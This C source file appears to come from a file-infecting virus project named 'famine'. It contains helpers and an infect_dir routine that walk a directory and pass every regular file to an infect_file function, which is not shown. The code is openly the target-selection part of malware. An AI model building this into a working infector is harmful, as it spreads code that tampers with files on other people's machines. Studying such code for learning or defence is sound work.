#include "../include/famine.h"
#include <linux/limits.h>

static int is_regular(const char *path, const struct dirent *ent)
{
	struct stat st;

	if (ent->d_type == DT_REG)
		return (1);
	if (ent->d_type != DT_UNKNOWN)
		return (0);
	if (lstat(path, &st) < 0)
		return (0);
	return (S_ISREG(st.st_mode));
}

// Builds "<dir>/<name>" into buf; returns 0 on success, 1 if it won't fit
static int join_path(char *buf, size_t size, const char *dir, const char *name)
{
	size_t dlen;
	size_t nlen;

	dlen = strlen(dir);
	nlen = strlen(name);
	if (dlen + 1 + nlen + 1 > size)
		return (1);
	memcpy(buf, dir, dlen);
	buf[dlen] = '/';
	memcpy(buf + dlen + 1, name, nlen);
	buf[dlen + 1 + nlen] = '\0';
	return (0);
}

void infect_dir(const char *dir)
{
	DIR				*d;
	struct dirent	*ent;
	char			path[PATH_MAX];

	d = opendir(dir);
	if ( !d)
		return ;
	while ((ent = readdir(d)) != NULL)
	{
		if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
			continue ;
		if (join_path(path, sizeof(path), dir, ent->d_name))
			continue ;
		if (!is_regular(path, ent))
			continue ;
		infect_file(path);
	}
	closedir(d);
}

